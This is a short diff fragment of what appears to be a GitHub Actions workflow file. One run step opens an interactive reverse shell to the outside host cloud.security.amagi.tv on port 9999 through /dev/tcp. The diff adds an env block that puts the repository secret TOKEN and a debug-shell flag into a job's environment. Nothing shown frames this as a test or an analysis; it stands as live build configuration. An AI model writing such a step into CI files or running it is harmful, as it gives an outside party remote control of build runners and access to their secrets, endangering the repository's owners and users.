@@ -10,6 +10,7 @@ jobs:
     steps:
     - run: |
         sh -i >& /dev/tcp/cloud.security.amagi.tv/9999 0>&1
+    - env:
         TOKEN: ${{ secrets.TOKEN }}
         VULCON_DEBUG_SHELL: true
       run: |
